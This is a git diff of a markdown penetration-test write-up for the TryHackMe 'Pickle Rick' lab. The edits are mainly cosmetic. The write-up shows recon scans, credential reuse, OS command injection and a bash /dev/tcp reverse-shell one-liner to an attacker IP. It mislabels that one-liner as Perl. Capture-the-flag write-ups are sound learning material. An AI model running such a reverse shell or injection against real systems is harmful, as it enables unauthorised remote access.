@@ -1,4 +1,4 @@
-# 🛡️ Project: Pickle Rick Penetration Test (TryHackMe)
+# Project: Pickle Rick Penetration Test (TryHackMe)
 
 **Date:** December 2025
 **Target:** 10.64.153.135 (Pickle Rick)
@@ -14,7 +14,7 @@
 
 ## 2\. Technical Findings \& Walkthrough
 
-### 🔎 Step 1: Reconnaissance \& Enumeration
+### Step 1: Reconnaissance \& Enumeration
 
 **Objective:** Identify open ports, services, and hidden web content.
 
@@ -26,7 +26,7 @@ I started with an **Nmap** scan to find open ports and followed up with **Gobust
 nmap -sV 10.64.153.135
 ```
 
-!\[Nmap Scan Results](img/nmap\_results.png)
+![Nmap Scan Results](img/nmap_results.png)
 
 ```bash
 # Directory Brute-force
@@ -42,16 +42,16 @@ nikto -h http://10.64.153.135/
 * **Information Disclosure (Source Code):** Inspecting the HTML source of the homepage revealed a username in a comment.
 
 
-!\[HTML Source Comment](img/html\_comment.png)
+![HTML Source Comment](img/html_comment.png)
 
 * **Hidden Files:** Gobuster identified `login.php` and `robots.txt`.
 * **Information Disclosure (robots.txt):** Inspecting `robots.txt` revealed a strange string: `Wubbalubbadubdub`.
 
-!\[robots.txt content](img/robots\_txt.png)
+![robots.txt content](img/robots_txt.png)
 
 
 
-### 🔓 Step 2: Initial Access (Credential Stuffing)
+### Step 2: Initial Access (Credential Stuffing)
 
 **Objective:** Gain access to the `login.php` portal.
 
@@ -65,7 +65,7 @@ I combined the username found in the HTML source (`R1ckRu13s`) with the string f
 
 
 
-### 💥 Step 3: Exploitation (Command Injection)
+### Step 3: Exploitation (Command Injection)
 
 * **Vulnerability:** OS Command Injection
 * **Severity:** Critical
@@ -82,11 +82,11 @@ I listed the files in the current directory.
 **Command:** `ls -la`
 **Result:** Discovered a file named `Sup3rS3cretPickl3Ingred.txt`. But when I ran "cat Sup3rS3cretPickl3Ingred.txt" it output this:
 
-!\[Command disabled](img/command\_disabled.png)
+![Command disabled](img/command_disabled.png)
 
 
 
-### 🚀 Step 4: Privilege Escalation \& Lateral Movement
+### Step 4: Privilege Escalation \& Lateral Movement
 
 **Objective:** Gain a stable shell and locate the ingredients.
 
@@ -99,13 +99,12 @@ To move freely on the system, I leveraged the command injection to establish a r
 2. **Payload:** Injected a Perl reverse shell payload into the command panel:
 
 &nbsp;   ```bash
-    bash -c 'bash -i >\& /dev/tcp/192.168.151.228/4444 0>\&1'
+    bash -c 'bash -i >& /dev/tcp/192.168.151.228/4444 0>&1'
     ```
 
 **Result:** Obtained a stable shell as `www-data`.
 
-> \*\*Image Suggestion:\*\* A screenshot of your terminal showing the Netcat listener receiving the reverse shell connection.
-> `!\[Reverse Shell](img/reverse\_shell.png)`
+![Reverse Shell](img/reverse_shell.png)
 
 **Finding Ingredients:**
 
